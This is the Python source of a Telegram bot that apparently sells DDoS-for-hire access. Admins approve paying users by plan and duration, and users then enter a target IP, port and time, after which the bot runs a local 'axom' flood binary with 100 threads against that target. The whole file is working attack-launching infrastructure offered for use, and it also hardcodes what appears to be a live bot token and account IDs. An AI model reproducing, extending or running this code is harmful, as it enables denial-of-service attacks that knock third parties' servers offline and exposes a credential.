import telebot
import logging
import subprocess
import json
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sys
import time
import threading  # Added for threading

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Constants
TOKEN = '7437695900:AAEE9y36FPQoKlW2lPaYNpBZskbJyzi7AvA'  # Replace with your actual bot token
CHANNEL_ID = -1002177435859
ADMIN_IDS = [5568478295]  # List of admin IDs
OWNER_ID = 5568478295  # Replace with your actual Telegram user ID
OWNER_NAME = "ANKUR"  # Replace with your actual name
USER_DATA_FILE = "users_data.json"
CREDIT_SECTION = {
    "credit": "This bot was created by AXOM. Unauthorized modification will disable the bot."
}

# Original credit section for validation
ORIGINAL_CREDIT_SECTION = {
    "credit": "This bot was created by AXOM. Unauthorized modification will disable the bot."
}

# Check if the credit section has been modified
if CREDIT_SECTION != ORIGINAL_CREDIT_SECTION:
    logging.error("Credit section has been modified. Exiting the bot.")
    sys.exit(1)

# Initialize bot and variables
bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

# Function to load user data from the file
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        logging.warning("User data file not found. Returning empty data.")
        return {}

# Function to save user data to the file
def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)
        logging.info("User data saved successfully.")

# Load initial user data
user_data = load_user_data()

# Function to run the attack command asynchronously
def run_attack_command_async(user_id, target_ip, target_port, duration):
    def attack_and_notify():
        try:
            command = ["./axom", target_ip, str(target_port), str(duration), "100"]  # Default threads set to 100
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[user_id] = process.pid
            logging.info(f"Started attack: PID {process.pid} for User {user_id} on {target_ip}:{target_port} for {duration} seconds")

            # Send message that attack is in progress
            bot.send_message(user_id, f"*🎯 Attack on {target_ip}:{target_port} is in progress...*", parse_mode='Markdown')
            
            # Wait for the specified duration
            time.sleep(duration)
            
            # Send finished attack message
            bot.send_message(user_id, f"*✅ Attack on {target_ip}:{target_port} finished after {duration} seconds.*", parse_mode='Markdown')
            logging.info(f"Attack finished: PID {process.pid} for User {user_id}")

        except Exception as e:
            logging.error(f"Error in attack_and_notify: {e}")

    # Start the attack in a separate thread
    threading.Thread(target=attack_and_notify).start()

# Check if the user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Check if the user is approved to attack
def check_user_approval(user_id):
    try:
        user_info = user_data.get(str(user_id))
        if user_info and user_info['plan'] > 0:
            valid_until = user_info.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval: {e}")
        return False

# Approve a user
def approve_user(user_id, plan, days):
    try:
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        user_data[str(user_id)] = {
            "plan": plan,
            "valid_until": valid_until,
            "access_count": 0
        }
        save_user_data(user_data)
        logging.info(f"User {user_id} approved with plan {plan} for {days} days.")
        return True
    except Exception as e:
        logging.error(f"Error approving user: {e}")
        return False

# Disapprove a user
def disapprove_user(user_id):
    try:
        user_data.pop(str(user_id), None)
        save_user_data(user_data)
        logging.info(f"User {user_id} disapproved and removed from the list.")
    except Exception as e:
        logging.error(f"Error in disapproving user: {e}")

# Send not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫*", parse_mode='Markdown')

# Send main action buttons
def send_main_buttons(chat_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛠️ SET IP AND PORT", callback_data="set_ip_port"))
    bot.send_message(chat_id, "*🔧 Choose an action:*", reply_markup=markup, parse_mode='Markdown')

# Handle /start command with a welcome message
@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_message = (
        "*🎉 Welcome to the Bot! 🎉*\n\n"
        "*🔰 BRAND MOD X AXOM 🔰*\n"
        "*🚫This script is free and not for sale.*\n"
        "*⚠️ Unauthorized modification will disable the bot.*"
    )
    bot.send_message(message.chat.id, welcome_message, parse_mode='Markdown')
    send_main_buttons(message.chat.id)

# Approve user command
@bot.message_handler(commands=['approve'])
def approve_user_handler(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*🚫 You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(message.chat.id, "*❌ Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])

        if approve_user(target_user_id, plan, days):
            bot.send_message(message.chat.id, f"*✅ User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*❌ Failed to approve user.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*❌ Failed to approve user.*", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")

# Disapprove user command
@bot.message_handler(commands=['disapprove'])
def disapprove_user_handler(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*🚫 You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(message.chat.id, "*❌ Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        disapprove_user(target_user_id)
        bot.send_message(message.chat.id, f"*✅ User {target_user_id} disapproved and removed from the list.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*❌ Failed to disapprove user.*", parse_mode='Markdown')
        logging.error(f"Error in disapproving user: {e}")

# Handle callback queries for inline buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "set_ip_port":
        if not check_user_approval(call.message.chat.id):
            send_not_approved_message(call.message.chat.id)
            return

        bot.send_message(call.message.chat.id, "*📡 Please provide the target IP, port, and duration separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(call.message, process_attack_params)

    elif call.data == "start_attack":
        start_attack(call)

# Process attack parameters
def process_attack_params(message):
    try:
        args = message.text.split()
        
        # Check for correct number of arguments
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❌ Invalid format. Provide IP, port, and duration.*", parse_mode='Markdown')
            return
        
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
        
        # Store the user attack details
        user_attack_details[message.from_user.id] = (target_ip, target_port, duration)
        bot.send_message(message.chat.id, "*✅ IP, port, and duration set successfully.*", parse_mode='Markdown')
        
        # Send start attack button
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack"))
        bot.send_message(message.chat.id, "*🔘 Click the button to start the attack.*", reply_markup=markup, parse_mode='Markdown')
    
    except Exception as e:
        bot.send_message(message.chat.id, "*❌ Failed to process attack parameters.*", parse_mode='Markdown')
        logging.error(f"Error processing attack parameters: {e}")

# Start the attack
def start_attack(call):
    user_id = call.from_user.id
    
    if user_id not in user_attack_details:
        bot.send_message(call.message.chat.id, "*❌ No attack details found. Please set the parameters first.*", parse_mode='Markdown')
        return
    
    target_ip, target_port, duration = user_attack_details[user_id]
    
    if target_port in blocked_ports:
        bot.send_message(call.message.chat.id, "*🚫 The selected port is blocked. Choose another port.*", parse_mode='Markdown')
        return
    
    if check_user_approval(user_id):
        run_attack_command_async(user_id, target_ip, target_port, duration)
    else:
        send_not_approved_message(user_id)

# Run the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    bot.polling()
    